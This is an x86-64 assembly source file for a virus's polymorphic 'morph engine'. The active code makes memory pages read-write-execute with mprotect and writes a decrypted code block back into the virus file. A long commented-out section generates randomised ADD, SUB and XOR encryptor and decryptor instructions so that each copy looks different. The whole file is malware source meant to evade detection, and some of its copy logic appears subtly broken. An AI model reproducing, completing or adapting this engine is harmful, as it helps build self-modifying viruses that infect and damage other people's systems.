%include "template.asm.inc"

global morph_engine

extern rand
%define OPCODE_ADD_REG 0x01
%define OPCODE_SUB_REG 0x29
%define OPCODE_XOR     0x31

section .data

	ModRegRM  dd 0xCB, 0xD8, 0xC1, 0xC8, 0xD0, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xD3

section .text


morph_engine:
;create stack frame
push rbp
mov  rbp, rsp
sub  rsp, 0x30
push rbx
push r12
push r13
push r14
push r15

;save data of using registers
mov [rbp-0x28], rdi ; virus data
mov [rbp-0x20], rsi ; offset of encrypt section
mov [rbp-0x18],	rdx ; size of virus in hexa
mov [rbp-0x10],	rcx ; offset of decrypter section
mov [rbp-0x30], r8  ; full address of current encrypt section (main function)


; write access from virus file, main to _start-main
add rdi, rsi
; this gives us main in the virus file

; unprotect virus file from write protection
call getpagesize
; rax has 0x1000
mov rcx, rax
; save rax for later use when passing to mprotect
sub rcx, 0x1
not rcx
; mov rdi, .encryption_function
and rdi, rcx
; AND them and the result will be stored in rcx
; rdi must hold the page_start address

lea rsi, [rdi+rdx]      ;rsi = end
sub rsi,rdi      ;rsi = end - aligned_start = length

mov rdx, 0x7
; read+write+exec = 0x7
call mprotect


; reload data
mov rdi, [rbp-0x28]  ; virus data
mov rsi, [rbp-0x20]  ; offset of encrypt section
mov rdx, [rbp-0x18]  ; size of virus in hexa
mov rcx, [rbp-0x10]  ; offset of decrypter section
mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)




; write decrypted block from memory to virus file
mov r14, r8
add rdi, rsi
; rdi = _virus_+main
mov r15, rdi
add r15, rdx
; r15 = _virus_ + main + enc_size
.write_decrypted_loop:
	; load first 16bytes of memory data to registers
	mov rax, [r14]
	mov rbx, [r14+0x4]
	mov rcx, [r14+0x8]
	mov rdx, [r14+0xC]

.write_decrypted_function:
	; put what was taken from memory to equivalent place in the virus file
	mov [rdi], rax
	mov [rdi+0x4], rbx
	mov [rdi+0x8], rcx
	mov [rdi+0xC], rdx
	add r14, 0x10
	add rdi, 0x10
	; add 10h to r8, fast forwards rsi to grabbing next 16 bytes
	cmp r14, r15
	;compare if r8 = r15, signalling end of decryption
	jne .write_decrypted_loop



; call getpagesize
; ; rax has 0x1000
; mov rcx, rax
; ; save rax for later use when passing to mprotect
; sub rcx, 0x1
; not rcx
; mov rdi, .encryption_function
; and rdi, rcx
; ; AND them and the result will be stored in rcx
; ; rdi must hold the page_start address

; lea rsi, [rdi+FUNC_SIZE]      ;rsi = end
; sub rsi,rdi      ;rsi = end - aligned_start = length

; mov rdx, 0x7
; ; read+write+exec = 0x7
; call mprotect


; ; set up needed values
; mov r12, .encryption_function
; mov rbx, .encryption_function
; add rbx, FUNC_SIZE
; sub rbx, 0x1
; ; must use rbx here because rbx is the only one that will not change on rand call later
; mov r13, [rbp-0x28]
; add r13, [rbp-0x10] 
; add r13, FUNC_SIZE
; ; end of 
; mov r15, ModRegRM



; .encrypt_logic_loop:
; 	call rand
; 	xor rdx, rdx
; 	mov rcx, 3
; 	; this modding value should indicate number of functions available
; 	div rcx
; 	cmp r12, rbx
; 	;end encryption and jump to end
; 	ja .encrypt_function_load_values
; 	jmp [.jump_function_table+rdx*8]
; 	align 4
; 	.jump_function_table: dq .func_add_reg,
; 						  dq .func_nop,
; 						  dq .func_xor




; .func_add_reg:
; 	call rand
; 	xor rdx, rdx
; 	mov rcx, 12
; 	; this modding value should indicate number of modregrm values available
; 	div rcx
; 	cmp r12, rbx

; 	sub r13, 0x2
; 	xor rax, rax
; 	mov al, [r15+rdx*4]
; 	; this will always result in and address that contains an modregrm opcode
; 	xor rcx, rcx
; 	mov ch, al
; 	mov ah, OPCODE_ADD_REG
; 	mov cl, OPCODE_SUB_REG
; 	xchg al, ah
; 	mov [r12], ax
; 	mov [r13], cx
; 	add r12, 0x2
; 	jmp .encrypt_logic_loop



; .func_nop:
; ; just move the pointer up and down for encrypt/decrypt
; 	sub r13, 0x2
; 	add r12,0x2
; 	jmp .encrypt_logic_loop

; .func_xor:
; 	call rand
; 	xor rdx, rdx
; 	mov rcx, 12
; 	; this modding value should indicate number of modregrm values available
; 	div rcx
; 	cmp r12, rbx

; 	sub r13, 0x2
; 	xor rax, rax
; 	mov al, [r15+rdx*4]
; 	; this will always result in and address that contains an modregrm opcode
; 	xor rcx, rcx
; 	mov ch, al
; 	mov ah, OPCODE_XOR
; 	mov cl, OPCODE_XOR
; 	xchg al, ah
; 	mov [r12], ax
; 	mov [r13], cx
; 	add r12, 0x2
; 	jmp .encrypt_logic_loop	


; .encrypt_function_load_values:

; 	mov rbx, [rbp-0x28]
; 	mov rsi, [rbp-0x20]
; 	add rsi, rbx
; 	; rsi = full address of virus.start
; 	mov rdi, [rbp-0x18]
; 	add rdi, rsi
; 	; rdi = full address of the virus.end


; .encryption_loop:
; 	; load first 16bytes of memory data to registers
; 	mov eax, [rsi]
; 	mov ebx, [rsi+0x4]
; 	mov ecx, [rsi+0x8]
; 	mov edx, [rsi+0xC]

; .encryption_function:
; 	times FUNC_SIZE db OP_NOP
; 	; put back the data to where it was taken from
; 	mov [rsi], eax
; 	mov [rsi+0x4], ebx
; 	mov [rsi+0x8], ecx
; 	mov [rsi+0xC], edx
; 	add rsi, 0x10
; 	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
; 	cmp rsi, rdi
; 	;compare if rsi = rdi, signalling end of decryption
; 	jne .encryption_loop




xor rax,rax 
; this will ensure rax = 0 , means completed without error
pop r15
pop r14
pop r13
pop r12
pop rbx
mov rsp, rbp
pop rbp
ret